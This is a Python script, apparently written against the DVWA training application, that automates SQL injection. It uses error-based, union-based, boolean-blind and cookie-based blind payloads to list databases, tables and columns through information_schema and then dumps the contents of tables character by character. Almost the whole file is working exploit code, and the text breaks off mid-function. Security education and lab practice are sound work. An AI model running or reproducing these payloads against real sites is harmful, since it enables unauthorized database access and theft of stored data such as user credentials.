#!/usr/bin/env python3

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
from time import sleep
from urllib.parse import unquote
from urllib.parse import quote
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

import subprocess
import string
import random
import hashlib
import datetime
import urllib
import base64
import html
import os
import codecs
import binascii
import sys
import re
import requests
import click


def sql_error_test(url,cookies):
  rep = requests.get(url,cookies=cookies)
  rep.encoding = 'utf-8'
  soup = BeautifulSoup(rep.text,"html5lib")

  try:
    method = soup.form['method']
  except:
    method = ''
    pass

  if method.lower() == 'get':
      submit = soup.form("input")[1]['name']
      value = submit = soup.form("input")[1]['value']
      ids = soup.form("input")[0]['name']
      param = {ids:"'",submit:value}
      rep = requests.get(url,params=param,cookies=cookies)
      payload_test(rep.url,rep.text,cookies)

def payload_test(url,text,cookies):
  m = re.search(".*error in your SQL syntax.*near.*line.*",text)
  if m is not None:
    print("Continue to tested .....")
    urllist = url.split("%27")
    pay = "1' or '1'='1"
    str1 = pay.join(urllist)
    rep = requests.get(str1,cookies=cookies)
    soup = BeautifulSoup(rep.text,"html5lib")
    pre = soup("pre")
    vlun = re.search(pay,str(pre))
    if vlun is not None:
      print("\033[1;32m INFO\033[0m Target is vlunabled")
      print("\033[1;32m INFO\033[0m The payload: %s" % pay)
      for each in range(len(soup("pre"))):
        names = re.search("First name: \w{1,10}",str(soup("pre")[each]))
        last = re.search("Surname: \w{1,10}",str(soup("pre")[each]))
        print("\033[1;32m INFO\033[0m",names.group(0),last.group(0))

  get_database(url,cookies)

def get_database(url,cookies):
  columnlist = []
  list2 = []
  tablelist = []
  payload = ""
  list1 = url.split("%27")
  # get current_db
  str1 = "' union select schema_name,database() from information_schema.schemata -- ".join(list1)
  rep = requests.get(str1,cookies=cookies)
  soup = BeautifulSoup(rep.text,"html5lib")
  prenumber = soup.find_all("pre")
  for each in range(len(prenumber)):
    s = re.search("First name: \w{0,20}",str(prenumber[each]))
    list2.append(s.group(0).split(" ")[-1])
    print("\033[1;32m INFO\033[0m schema databases:",s.group(0).split(" ")[-1])
  list2.pop()
  if "information_schema" not in list2:
    print("\033[1;32m Exploit\033[0m The databases:",list2[-1])
  for ex in range(len(list2)):
    str2 = "' union select table_schema,table_name from information_schema.tables -- ".join(list1)
    rep1 = requests.get(str2,cookies=cookies)
    soup = BeautifulSoup(rep1.text,"html5lib")
    pre1 = soup.find_all("pre")
    for table in range(len(pre1)):
      s1 = re.search(list2[ex],str(pre1[table]))
      if s1 is not None:
        s2 = re.search("Surname: \w{0,20}",str(pre1[table]))
        s2 = s2.group(0).split(' ')[-1]
        tablelist.append(s2)
        print("\033[1;32m Exploit\033[0m database of The Tables:",s2)

  str3 = "' union select column_name,table_name from information_schema.columns -- ".join(list1)
  rep2 = requests.get(str3,cookies=cookies)
  soup = BeautifulSoup(rep2.text,"html5lib")
  pre2 = soup.find_all("pre")
  for x in range(len(pre2)):
    s3 = re.search("Surname: \w{0,20}",str(pre2[x]))
    col = s3.group(0).split(' ')[-1]
    if tablelist.count(col):
      s3 = re.search("First name: \w{0,20}",str(pre2[x])).group(0).split(" ")[-1]
      columnlist.append(s3)
      print("\033[1;32m Exploit\033[0m tables of The Columns:",s3)
  print("\033[1;41m Get all data\033[0m ")
  count = 0

  while(True):
    if(len(columnlist) == count):
      break
    str4 = "' union select "+columnlist[count]+",1 from "+tablelist[0]+" -- "
    str4 = str4.join(list1)
    rep3 = requests.get(str4,cookies=cookies)
    soup = BeautifulSoup(rep3.text,"html5lib")
    pre3 = soup.find_all("pre")
    s4 = re.search("First name: \w{0,20}",str(pre3))
    if s4 is None:
      break

    print("\033[1;32m Table\033[0m "+tablelist[0],"\033[1;32m Column\033[0m "+columnlist[count],"\033[1;32m Data\033[0m "+s4.group(0).split(" ")[-1])
    #print(columnlist[count])
    count += 1
  #for count in range(len(columnlist)):
  #  str4 = "' union select "+columnlist[count]+","+columnlist[count+1]+" from "+tablelist[0]+" -- ".join(list1)
  count = 0
  while(True):
    if(len(columnlist) == count):
      break
    str5 = "' union select "+columnlist[count]+",1 from "+tablelist[1]+" -- "
    str5 = str5.join(list1)
    rep4 = requests.get(str5,cookies=cookies)
    soup = BeautifulSoup(rep4.text,"html5lib")
    pre4 = soup.find_all("pre")
    if "Unknown" in str(pre4[0]):
      count += 1
      continue
    for num in range(len(pre4)):
      s5 = re.search("First name: \w{0,20}",str(pre4[num]))
      if s5 is None:
        pass
      print("\033[1;32m Table\033[0m "+tablelist[1],"\033[1;32m Column\033[0m "+columnlist[count],"\033[1;32m Data\033[0m "+s5.group(0).split(" ")[-1])

    count += 1
  #print(tablelist,columnlist)
  #print(str3)

def sql_error_level2_test(url,cookies):
  rep = requests.get(url,cookies=cookies)
  soup = BeautifulSoup(rep.text,"html5lib")
  if soup.form['method'].lower() == "post":
    ID = soup("select")[0]["name"]
    opvalue = soup.form("option")[0]["value"]
    opvalue = opvalue + " or 1=1"
    name = soup.form("input")[0]["name"]
    inputvalue = soup.form("input")[0]["value"]
    data = DATA([ID,name],[opvalue,inputvalue])
    rep = requests.post(url,data=data,cookies=cookies)
    soup = BeautifulSoup(rep.text,"html5lib")
    match = re.findall(" \w{0,20}",str(soup.pre))
    print("\033[1;32m target vulnerabled,payload\033[0m:"+opvalue+"\033[1;32m DATA:\033[0m"+match[4])
    print("\033[1;33m Exploit The databases\033[0m ")
    opvalue = "0 union select schema_name,2 from information_schema.schemata"
    data = DATA([ID,name],[opvalue,inputvalue])
    text = POST(url,cookies,data)
    match = re.findall("First name: \w{0,20}",text)
    for each in match:
      base = each.split("First name: ")[-1]
      if base == "information_schema":
        continue
      print("\033[1;32m database find\033[0m:"+base)
    print("\033[1;33m Exploit The tables\033[0m")
    opvalue = "0 union select table_name,table_schema from information_schema.tables"
    data = DATA([ID,name],[opvalue,inputvalue])
    text = POST(url,cookies=cookies,data=data)
    tablelist = FIND_TABLE(text)
    for table in tablelist:
      print("\033[1;32m table find\033[0m:"+table)
    opvalue = "0 union select column_name,table_name from information_schema.columns"
    data = DATA([ID,name],[opvalue,inputvalue])
    text = POST(url,cookies=cookies,data=data)
    columnlist = FIND_COLUMN(text,tablelist)
    print("\033[1;33m Dump All Find datas\033[0m")
    for t in tablelist:
      for c in columnlist:
        opvalue = "0 union select "+c+",1 from "+t
        data = DATA([ID,name],[opvalue,inputvalue])
        text = POST(url,cookies=cookies,data=data)
        dump(t,c,text)

def POST(url,cookies,data):
  rep = requests.post(url,cookies=cookies,data=data)
  return rep.text

def DATA(list1,list2):
  data = dict(zip(list1,list2))
  return data

def FIND_TABLE(text,pattern="First name: \w{0,20}<br />Surname: \w{0,20}"):
  tablelist = []
  match = re.findall(pattern,text)
  for num in match:
    schema = num.split("<br />")[1].split(" ")[-1]
    table = num.split("<br />")[0].split(" ")[-1]
    if schema == "information_schema":
      pass
    else:
      tablelist.append(table)

  return tablelist

def FIND_COLUMN(text,tablelist,pattern="First name: \w[0,50]<br />Surname: \w{0,50}"):
  columnlist = []
  soup = BeautifulSoup(text,"html5lib")
  print("\033[1;33m Exploit The columns\033[0m")
  for each in soup.find_all("pre"):
    prelist = each.find_all(string=True)
    table = prelist[-1].split(" ")[-1]
    column = prelist[-2].split(" ")[-1]
    if table not in tablelist:
      pass
    else:
      print("\033[1;32m column find\033[0m:"+column)
      columnlist.append(column)
  return columnlist

def dump(table,column,text):
  text = re.findall("First name: \w{0,20}",text)
  if text:
    print("\033[1;32m Dump table\033[0m \033[1m "+table+"\033[0m")
    for each in text:
      each = each.split(" ")[-1]
      print("\033[1;32m Dump column: \033[0m"+column+"\033[0m","\033[1;32m DATA: \033[0m\033[1;31m"+each+"\033[0m")

def high(url,cookies):
  rep = requests.get(url,cookies=cookies)
  soup = BeautifulSoup(rep.text,"html5lib")
  if "Something went wrong" in rep.text:
    sessionphp = "session-input.php"
    sessionurl = url + sessionphp
    ID = "id"
    Submit = "Submit"
    IDvalue = "' union select schema_name,2 from information_schema.schemata #"
    data = DATA([ID,Submit],[IDvalue,Submit])
    rep = requests.post(sessionurl,cookies=cookies,data=data)
  else:
    sessionphp = re.search("\w{0,10}-\w{0,10}\.php",str(soup.find_all(href="#")))
    sessionurl = url + sessionphp.group(0)
    rep = requests.get(sessionurl,cookies=cookies)
    soup = BeautifulSoup(rep.text,"html5lib")
    if str(soup.form["method"]).lower() == 'post':
      ID = soup.form("input")[0]["name"]
      Submit = soup.form("input")[1]["name"]
      Submitvalue = soup.form("input")[1]["value"]
      IDvalue = "' union select schema_name,1 from information_schema.schemata #"
      data = DATA([ID,Submit],[IDvalue,Submitvalue])
      rep = requests.post(sessionurl,cookies=cookies,data=data)

  list1 =  []
  if rep.ok:
    rep = requests.get(url,cookies=cookies)
    database = re.findall("First name: \w{0,20}",rep.text)
    for base in database:
      base = base.split(" ")[-1]
      if base == "information_schema":
        continue
      else:
        list1.append(base)
        print("find \033[1;32mdatabase:\033[0m "+base)

  IDvalue = "' union select table_name,table_schema from information_schema.tables #"
  data = DATA([ID,Submit],[IDvalue,Submit])
  rep = requests.post(sessionurl,cookies=cookies,data=data)

  list2 = []
  if rep.ok:
    rep = requests.get(url,cookies=cookies)
    All = re.findall("First name: \w{0,40}<br />Surname: \w{0,40}",rep.text)
    for each in All:
      Surname = each.split(" ")[-1]
      if Surname == "information_schema":
        pass
      else:
        each = each.split(": ")[1].split("<")[0]
        print("find \033[1;32mtable \033[0m"+each+" of the " \
            "\033[1;31mdatabase\033[0m "+Surname)
        list2.append(each)

  IDvalue = "' union select table_name,column_name from " \
  "information_schema.columns #"
  data = DATA([ID,Submit],[IDvalue,Submit])
  rep = requests.post(sessionurl,cookies=cookies,data=data)
  list3 = []
  if rep.ok:
    rep = requests.get(url,cookies=cookies,data=data)
    All = re.findall("First name: \w{0,40}<br />Surname: \w{0,40}",rep.text)
    for each in All:
      First_name = each.split(": ")
      First_name = First_name[1].split("<")[0]
      if First_name in list2:
        each = each.split(" ")[-1]
        list3.append(each)
        print("find \033[1;32mcolumn\033[0m "+each+"of the \033[1;31mtable\033[0m "+First_name)
      else:
        pass
  for table in list2:
    for column in list3:
      IDvalue = "' union select "+column+",1 from "+table+" #"
      data = DATA([ID,Submit],[IDvalue,Submit])
      rep = requests.post(sessionurl,cookies=cookies,data=data)
      if rep.ok:
        rep = requests.get(url,cookies=cookies)
        dump(table,column,rep.text)

def blind_low(url,cookies):
  rep = requests.get(url,cookies=cookies)
  soup = BeautifulSoup(rep.text,"html5lib")

  if soup.form['method'].lower() == 'get':
    get = True

  name = []
  value = []
  for each in range(len(soup.form("input"))):
    Name = soup.form("input")[each]["name"]
    name.append(Name)
    try:
      Value = soup.form("input")[each]["value"]
      value.append(Value)
    except KeyError:
      pass
  print("get the blind level low database")

  count = 0
  db = []
  while(get):
    payload = "1' and (select count(schema_name) from information_schema.schemata)="+str(count)+" #"
    param = DATA(name,[payload,value[0]])
    rep = requests.get(url,cookies=cookies,params=param)
    if "MISSING" in rep.text:
      count += 1
    elif "exists" in rep.text:
      for number in range(count):
        str1 = ''
        count1 = 0
        while(get):
          payload = "1' and length((select schema_name from information_schema.schemata limit "+str(number)+",1))="+str(count1)+" #"
          param = DATA(name,[payload,value[0]])
          rep = requests.get(url,cookies=cookies,params=param)
          if "MISSING" in rep.text:
            count1 += 1
          elif "exists" in rep.text:
            count2 = 1
            while(get):
              for number3 in range(32,127):
                payload = "1' and ascii(substr((select schema_name from " \
                "information_schema.schemata limit " \
                ""+str(number)+",1),"+str(count2)+",1))="+str(number3)+" #"
                param = DATA(name,[payload,value[0]])
                rep = requests.get(url,cookies=cookies,params=param)
                if "exists" not in rep.text:
                  pass
                else:
                  str1 = str1 + chr(number3)
                  if len(str1) == count1:
                    db.append(str1)
                    break
              count2 += 1
              if count2 == count1+1:
                break
            break
        count1 = 0
      break
  print("get %d db " % len(db),str(db))
  print("enum the database,will not include information_schema")

  return {"url":url,"cookies":cookies,"db":db,"param":param}


def blind_low_enum(Data):
  enum = None
  url = Data['url']
  cookies = Data['cookies']
  Y = False
  db = Data['db']
  param = Data['param']

  if not Y:
    db.remove("information_schema")

  table_count = 0
  while(True):
    payload = "1' and (select count(table_name) from information_schema.tables)="+str(table_count)+" #"
    param['id'] = payload
    rep = requests.get(url,params=param,cookies=cookies)
    if "MISSING" in rep.text:
      table_count += 1
    elif "exists" in rep.text:
      break

  table_list = []
  for num in range(table_count):
    number = 0
    while(True):
      payload = "1' and length((select" \
          " concat_ws('-^-',table_schema,table_name,column_name) from "\
          "information_schema.columns limit" \
          " "+str(num)+",1))="+str(number)+" #"
      param['id'] = payload
      rep = requests.get(url,params=param,cookies=cookies)
      if "MISSING" in rep.text:
        number += 1
      elif "exists" in rep.text:
        table_list.append(number)
        break

  END = False
  for number in range(table_count):
    for ranges in table_list:
      str2 = ''
      column_list = []
      for step in range(ranges):
        count = 0
        while(True):
          payload = "1' and ascii(substr((select concat_ws('-^-',table_schema,table_name," \
              "column_name) from information_schema.columns limit "+str(number) \
                  + ",1),"+str(step+1)+",1))="+str(count)+" #"
          param['id'] = payload
          rep = requests.get(url,params=param,cookies=cookies)
          if "MISSING" in rep.text:
            count += 1
          elif "exists" in rep.text:
            break

        str2 = str2 + chr(count)
        if "-^-" in str2:
          have_db = str2.split("-^-")[0]
          if have_db not in db:
            if not Y:
              if "information_schema" == have_db:
                END = True
                break
      if END:
        break
      if len(str2) == ranges:
        column_list.append(str2)
        blind_data(url,param,column_list,cookies)
        break

    if END:
      break

def blind_data(url,param,column_list,cookies):

  data_list = []
  for each in column_list:
    if "\x00" in each:
      each = each.split("\x00")[0]
      data_list.append(each)
    else:
      data_list.append(each)

  list4 = []
  for each in data_list:
    each = each.split("-^-")
    count = 0
    while True:
      payload = "1' and (select count("+each[2]+") from "+each[1]+")="+str(count)+" #"
      param['id'] = payload
      rep = requests.get(url,params=param,cookies=cookies)
      if "MISSING" in rep.text:
        count += 1
      elif "exists" in rep.text:
        list4.append(count)
        break

  # get the each data
  for x,i in enumerate(list4,start=0):
    for step in range(i):
      data = data_list[x].split("-^-")
      db = data[0]
      dtable = data[1]
      dcolumn = data[2]
      count = 0
      while True:
        payload = "1' and length((select "+dcolumn+" from "+dtable+" limit " \
        +str(step)+",1))="+str(count)+" #"
        param['id'] = payload
        rep = requests.get(url,params=param,cookies=cookies)
        if "MISSING" in rep.text:
          count += 1
        elif "exists" in rep.text:
          str1 = ''
          for sub in range(count):
            count1 = 32
            while True:
              payload = "1' and ascii(substr((select "+dcolumn+" from "+dtable+" limit " \
                  +str(step)+",1),"+str(sub+1)+",1))="+str(count1)+" #"
              param['id'] = payload
              rep = requests.get(url,params=param,cookies=cookies)
              if "MISSING" in rep.text:
                count1 += 1
              elif "exists":
                str1 = str1 + chr(count1)
                break
          if len(str1) == sub+1:
            print("\033[1;32mThe DB:\033[0m "+db,end='')
            print("\033[1;32m The TABLE:\033[0m "+dtable,end='')
            print("\033[1;32m The COLUMN:\033[0m "+dcolumn)
            print("\033[1;31mThe DATA:\033[0m "+str1)
          break


def post_blind(url,cookies):
  rep = requests.get(url,cookies=cookies)
  soup = BeautifulSoup(rep.text,"html5lib")
  if soup.form['method'].lower() != 'post':
    post = 'post'
  else:
    post = 'post'
  if post == 'post':
    ID = soup.find_all("select")[0]['name']
    value = soup.find_all("option")[0]['value']
    Submit = soup.form("input")[0]['name']
    submit = soup.form("input")[0]['value']
    data = DATA([ID,Submit],[value,submit])

    if 'id' not in data:
      return print("wrong payload")
  #db_data = ['dvwa']
  #tb_data = ['guestbook','users',"somthing else"]
  #cm_data = ['comment_id','comment','name','user_id','first_name','last_name','user','password','avatar','last_login','failed_login','else something']

  db_count = database_count(url,cookies,data)
  print(db_count)
  db_length = database_length(url,cookies,data,db_count)
  print(db_length)
  db_data = database_data(url,cookies,data,db_length)
  print(db_data)
  INPUT = input("will you like to enumeration the information_schema?:")
  if "Y" == INPUT or "Yes" == INPUT  or "yes" == INPUT or "y" == INPUT:
    db_data.remove("information_schema")
  tb_count = table_count(url,cookies,data)
  print(tb_count)
  tb_length = table_length(url,cookies,data,tb_count)
  print(tb_length)
  tb_data = table_data(url,cookies,data,tb_length)
  print(tb_data)
  cm_count = column_count(url,cookies,data)
  print(cm_count)
  cm_length = column_length(url,cookies,data,cm_count)
  print(cm_length)
  cm_data = column_data(url,cookies,data,cm_length)
  print(cm_data)

  line_data = data_line(url,cookies,data,db_data,tb_data,cm_data)
  line_count = data_count(url,cookies,data,line_data)
  the_step = data_length(url,cookies,data,line_count)
  data_data(url,cookies,data,the_step)


def data_data(url,cookies,data,the_step):
  for num,list1 in enumerate(the_step):
    print("\033[1;32m Database \033[0m:"+list1[0],end='')
    print("\33[1;32m Table \033[0m:"+list1[1])
    for limit in range(list1[3]):
      for step_length in list1[4]:
        str1 = ''
        for step in range(step_length):
          count = 0
          while True:
            payload = "1 and ascii(substr((select "+list1[2]+" from "+list1[0] \
                +"."+list1[1]+" limit "+str(limit)+",1),"+str(step+1)+",1))="+ \
                str(count)
            data['id'] = payload
            rep = requests.post(url,data=data,cookies=cookies)
            if "MISSING" in rep.text:
              count += 1
            elif "exists" in rep.text:
              str1 = str1 + chr(count)
              break
        if len(str1) == step_length:
          print("\33[1;32m Column "+list1[2]+" \33[0m:",str1)
          break

def data_length(url,cookies,data,line_count):
  for num,line in enumerate(line_count):
    data_line = []
    for each in range(line[3]):
      count = 0
      while True:
        payload = "1 and length((select "+line[2]+" from "+line[0]+"."+line[1]+\
            " limit "+str(each)+",1))="+str(count)
        data['id'] = payload
        rep = requests.post(url,data=data,cookies=cookies)
        if "MISSING" in rep.text:
          count += 1
        elif "exists" in rep.text:
          data_line.append(count)
          break
    line_count[num].append(data_line)

  return line_count


def data_count(url,cookies,data,line_data):
  for num,line in enumerate(line_data):
    count = 0
    while True:
      payload = "1 and (select count("+line[2]+") from "+line[0]+"."+line[1]+\
          ")="+str(count)
      data['id'] = payload
      rep = requests.post(url,data=data,cookies=cookies)
      if "MISSING" in rep.text:
        count += 1
      elif "exists" in rep.text:
        line_data[num].append(count)
        break

  return line_data

def data_line(url,cookies,data,db_data,tb_data,cm_data):
  data_line_list = []
  for db in db_data:
    db = db.encode("utf-8")
    db = binascii.hexlify(db)
    db = db.decode("utf-8")
    db_hex = "0x"+db
    for tb in tb_data:
      tb = tb.encode("utf-8")
      tb = binascii.hexlify(tb)
      tb = tb.decode("utf-8")
      tb_hex = "0x"+tb
      for cm in cm_data:
        cm = cm.encode("utf-8")
        cm = binascii.hexlify(cm)
        cm = cm.decode("utf-8")
        cm_hex = "0x"+cm
        payload = "1 and (select count(*) from information_schema.columns " \
            "where table_schema="+db_hex+" and "+"table_name="+tb_hex+" " \
            "and column_name="+cm_hex+")=1"
        data['id'] = payload
        rep = requests.post(url,data=data,cookies=cookies)
        if "exists" in rep.text:
          db = db_hex.split("0x")[-1]
          tb = tb_hex.split("0x")[-1]
          cm = cm_hex.split("0x")[-1]
          db = binascii.a2b_hex(db).decode()
          tb = binascii.a2b_hex(tb).decode()
          cm = binascii.a2b_hex(cm).decode()
          data_line_list.append([db,tb,cm])
  return data_line_list

def column_data(url,cookies,data,cm_length):
  cm_data = []
  for limit_step,cm_len in enumerate(cm_length,start=0):
    cm_string = ''
    for length in range(cm_len):
      count = 0
      while True:
        payload = "1 and ascii(substr((select column_name from "\
            "information_schema.columns limit "+str(limit_step)+",1)," \
            +str(length+1)+",1))="+str(count)
        data['id'] = payload
        rep = requests.post(url,data=data,cookies=cookies)
        if "MISSING" in rep.text:
          count += 1
        elif "exists" in rep.text:
          cm_string = cm_string + chr(count)
          break
      if len(cm_string) == cm_len:
        cm_data.append(cm_string)
        print(cm_string)

  return cm_data

def column_length(url,cookies,data,cm_count):
  cm_length = []
  for x in range(cm_count):
    count = 0
    while True:
      payload = "1 and length((select column_name from " \
          "information_schema.columns limit "+str(x)+",1))="+str(count)
      data['id'] = payload
      rep = requests.post(url,data=data,cookies=cookies)
      if "MISSING" in rep.text:
        count += 1
      elif "exists" in rep.text:
        cm_length.append(count)
        break

  return iter(cm_length)

def column_count(url,cookies,data):
  count = 0
  while True:
    payload = "1 and (select count(column_name) from information_schema.columns"\
        ")="+str(count)
    data['id'] = payload
    rep = requests.post(url,cookies=cookies,data=data)
    if "MISSING" in rep.text:
      count += 1
    elif "exists" in rep.text:
      return count

def table_data(url,cookies,data,tb_length):
  tb_data = []
  for limit_step,tb_len in enumerate(tb_length,start=0):
    tb_string = ''
    for length in range(tb_len):
      count = 0
      while True:
        payload = "1 and ascii(substr((select table_name from " \
            "information_schema.tables limit "+str(limit_step)+",1),"\
            +str(length+1)+",1))="+str(count)
        data['id'] = payload
        rep = requests.post(url,data=data,cookies=cookies)
        if "MISSING" in rep.text:
          count += 1
        elif "exists" in rep.text:
          tb_string = tb_string + chr(count)
          break
      if len(tb_string) == tb_len:
        tb_data.append(tb_string)
        print(tb_string)

  return tb_data

def table_length(url,cookies,data,tb_count):
  tb_length = []
  for x in range(tb_count):
    count = 0
    while True:
      payload = "1 and length((select table_name from "\
          "information_schema.tables limit "+str(x)+",1))="+str(count)
      data['id'] = payload
      rep = requests.post(url,data=data,cookies=cookies)
      if "MISSING" in rep.text:
        count += 1
      elif "exists" in rep.text:
        tb_length.append(count)
        break

  return iter(tb_length)


def table_count(url,cookies,data):
  count = 0
  while True:
    payload = "1 and (select count(table_name) from " \
        "information_schema.tables)="+str(count)
    data['id'] = payload
    rep = requests.post(url,data=data,cookies=cookies)
    if "MISSING" in rep.text:
      count += 1
    elif "exists" in rep.text:
      return count


def database_data(url,cookies,data,db_length):
  db_data = []
  for limit_step,db_len in enumerate(db_length,start=0):
    db_string = ''
    for length in range(db_len):
      count = 0
      while True:
        payload = "1 and ascii(substr((select schema_name from information_schema.schemata "\
            "limit "+str(limit_step)+",1),"+str(length+1)+",1))="+str(count)
        data['id'] = payload
        rep = requests.post(url,data=data,cookies=cookies)
        if "MISSING" in rep.text:
          count += 1
        elif "exists" in rep.text:
          db_string = db_string + chr(count)
          break
      if len(db_string) == db_len:
        db_data.append(db_string)
        print(db_string)

  return db_data


def database_length(url,cookies,data,db_count):
  db_length = []   # each db length to save
  for x in range(db_count):
    count = 0
    while True:
      payload = "1 and length((select schema_name from information_schema.schemata "\
          "limit "+str(x)+",1))="+str(count)
      data['id'] = payload
      rep = requests.post(url,data=data,cookies=cookies)
      if "MISSING" in rep.text:
        count += 1
      elif "exists" in rep.text:
        db_length.append(count)
        break

  return iter(db_length)

def database_count(url,cookies,data):
  count = 0
  while True:
    payload = "1 and (select count(schema_name) from " \
    "information_schema.schemata)="+str(count)
    data['id'] = payload
    rep = requests.post(url,data=data,cookies=cookies)
    if "MISSING" in rep.text:
      count += 1
    elif "exists" in rep.text:
      return count

def  cookie_payload_data(url,cookies,cookie_length):
  cookie_data = []
  for limit_step,cookie_len in enumerate(cookie_length,start=0):
    cookie_string = ''
    for length in range(cookie_len):
      count = 32
      while True:
        payload = "1' and ascii(substr((select schema_name from information" \
            "_schema.schemata limit "+str(limit_step)+",1),"+str(length+1)+\
            ",1))="+str(count)+" #"
        cookies['id'] = payload
        rep = requests.get(url,cookies=cookies)
        if "MISSING" in rep.text:
          count += 1
        elif "exists" in rep.text:
          cookie_string = cookie_string + chr(count)
          print(cookie_string)
          break
      if len(cookie_string) == cookie_len:
        cookie_data.append(cookie_string)
        print(cookie_string)

  return cookie_data

def cookie_payload_length(url,cookies,cookie_count):
  cookie_length = []
  for x in range(cookie_count):
    count = 0
    while True:
      payload = "1' and length((select schema_name from information_schema."\
          "schemata limit "+str(x)+",1))="+str(count)+" #"
      cookies['id'] = payload
      rep = requests.get(url,cookies=cookies)
      if "MISSING" in rep.text:
        count += 1
      elif "exists" in rep.text:
        cookie_length.append(count)
        break

  return cookie_length


def cookie_payload_count(url,cookies):
  count = 0
  while True:
    payload = "1' and (select count(schema_name) from " \
        "information_schema.schemata)="+str(count)+" #"
    cookies['id'] = payload
    rep = requests.get(url,cookies=cookies)
    if "MISSING" in rep.text:
      count += 1
    elif "exists" in rep.text:
      return count


def enum_the_table(url,cookies,db,table_length):
  table = []
  for x,length in enumerate(table_length,start=0):
    table_string = ''
    for step in range(length):
      count = 0
      while True:
        payload = "1' and ascii(substr((select table_name from information_schema"\
            ".tables where table_schema='"+db+"' limit "+str(x)+",1)," \
            +str(step+1)+",1))="+str(count)+" #"
        cookies['id'] = payload
        rep = requests.get(url,cookies=cookies)
        if "MISSING" in rep.text:
          count += 1
        elif "exists" in rep.text:
          table_string = table_string + chr(count)
          print(table_string)
          break
    if len(table_string) == length:
      table.append(table_string)

  return table




def find_table_of_length(url,cookies,db,table_count):
  table_length = []
  for tb_count in range(table_count):
    count = 0
    while True:
      payload = "1' and length((select table_name from information_schema.tables " \
          "where table_schema='"+db+"' limit "+str(tb_count)+",1))="+str(count) \
          + " #"
      cookies['id'] = payload
      rep = requests.get(url,cookies=cookies)
      if "MISSING" in rep.text:
        count += 1
      elif "exists" in rep.text:
        table_length.append(count)
        break

  return table_length


def find_db_table_number(url,cookies,db):
  count = 0
  while True:
    payload = "1' and (select count(table_name) from information_schema."\
        "tables where table_schema='"+db+"')="+str(count)+" #"
    cookies['id'] = payload
    rep = requests.get(url,cookies=cookies)
    if "MISSING" in rep.text:
      count += 1
    elif "exists" in rep.text:
      return count


def find_table_column_number(url,cookies,db,table):
  table_column_count = []
  for each in table:
    count = 0
    while True:
      payload = "1' and (select count(column_name) from information_schema." \
          "columns where table_schema='"+db+"' and table_name='"+each+"')="\
          +str(count)+" #"
      cookies['id'] = payload
      rep = requests.get(url,cookies=cookies)
      if "MISSING" in rep.text:
        count += 1
      elif "exists" in rep.text:
        break
    table_column_count.append([each,count])

  return table_column_count

def find_each_column_length(url,cookies,db,table_list_column):
  tb_cm_len = []

  for table_list in table_list_column:
    for table in table_list:
      length = []
      for limit_column in range(table_list[1]):
        count = 0
        while True:
          payload = "1' and length((select column_name from information_schema.columns " \
            "where table_schema='"+db+"' and table_name='"+str(table)+"'" \
            " limit "+str(limit_column)+",1))="+str(count)+" #"
          cookies['id'] = payload
          rep = requests.get(url,cookies=cookies)
          if "MISSING" in rep.text:
            count += 1
          elif "exists" in rep.text:
            break
        length.append(count)
      if len(length) == table_list[1]:
        tb_cm_len.append([table_list[0],table_list[1],length])
        break

  return tb_cm_len

def get_columns(url,cookies,db,table,column):
  strings = ''
  for step in range(column[1]):
    count = 0
    while True:
      payload = "1' and ascii(substr((select column_name from information_schema." \
          "columns where table_schema='"+db+"' and " +" table_name='"+table+"'" \
          +" limit "+str(column[0])+",1),"+str(step+1)+",1))="+str(count) \
              + " #"
      cookies['id'] = payload
      rep = requests.get(url,cookies=cookies)
      if "MISSING" in rep.text:
        count += 1
      elif "exists" in rep.text:
        strings = strings + chr(count)
        print(strings)
        break
    if len(strings) == column[1]:
      return strings



def enum_data(url,cookies,db,table,column):
  data_list = []
  count = 0
  while True:
    payload = "1' and (select count("+column+") from "+db+"."+table+")=" \
        +str(count)+" #"
    cookies['id'] = payload
    rep = requests.get(url,cookies=cookies)
    print(payload)
    if "MISSING" in rep.text:
      count += 1
    elif "exists" in rep.text:
      for each in range(count):
        count1 = 0
        while True:
          payload = "1' and length((select "+column+" from "+db+"."+table+" limit " \
              +str(each)+",1))="+str(count1)+" #"
          cookies['id'] = payload
          rep = requests.get(url,cookies=cookies)
          if "MISSING" in rep.text:
            count1 += 1
          elif "exists" in rep.text:
            data_list.append(count1)
            break

      return data_list

def get_data(url,cookies,db,table,column,data):

  for x,i in enumerate(data):
    strings = ''
    for step in range(i):
      count = 0
      while True:
        payload = "1' and ascii(substr((select "+column+" from " \
            +db+"."+table+" limit "+str(x)+",1),"+str(step+1)+",1))=" \
            + str(count) + " #"

        cookies['id'] = payload
        rep = requests.get(url,cookies=cookies)
        if "MISSING" in rep.text:
          count += 1
        elif "exists" in rep.text:
          strings = strings + chr(count)
          print(strings)
          break
      if len(strings) == i:
        return strings

def high_level_blind(url,cookies):
  if 'id' not in cookies:
    cookies['id'] = "1"

  rep = requests.get(url,cookies=cookies)
  if "exists" in rep.text:
    cookie_count = cookie_payload_count(url,cookies)
    cookie_length = cookie_payload_length(url,cookies,cookie_count)
    cookie_data = cookie_payload_data(url,cookies,cookie_length)

  print("\033[1;32mrandom number may be disturb,useing interaction\033[0m")

  for x,i in enumerate(cookie_data):
    print(str(x)+" : "+i)

  ifrigh = True
  while ifrigh:
    which = input("which database you want to enum?:")
    try:
      db = cookie_data[int(which)]
      ifrigh = False
    except:
      print("wrong choice")
      pass

  #  interaction for time base slow tested

  print(db)
  table_count = find_db_table_number(url,cookies,db)
  print(table_count,"table_count")
  table_length = find_table_of_length(url,cookies,db,table_count)
  print(table_length)
  table = enum_the_table(url,cookies,db,table_length)
  print(table)


  ifrigh = True
  for x,i in enumerate(table):
    print(str(x)+" : "+i)

  while ifrigh:
    which = input("which table you want to enum?:")
    try:
      table = [table[int(which)]]
      ifrigh = False
    except:
      print("wrong input or choice")

  table_list_column = find_table_column_number(url,cookies,db,table)
  length_column = find_each_column_length(url,cookies,db,table_list_column)

  for each in length_column:
    for x,i in enumerate(each[2]):
      print(x,": ","column length %d" % i)

  ifrigh = True
  while ifrigh:
    which = input("which column you want to enum first?:")
    try:
      column = [which,length_column[0][2][int(which)]]
      ifrigh = False
    except:
      print("wrong input or  choice")

  print(db,table[0],column)

  column = get_columns(url,cookies,db,table[0],column)
  print(column)
  data  = enum_data(url,cookies,db,table[0],column)
  print(data)

  for x,i in enumerate(data):
    print(str(x)+" : "+str(i))

  ifrigh = True
  while ifrigh:
    which = input("which column data you want to enum first?:")
    try:
      data = [data[int(which)]]
      ifrigh = False
    except:
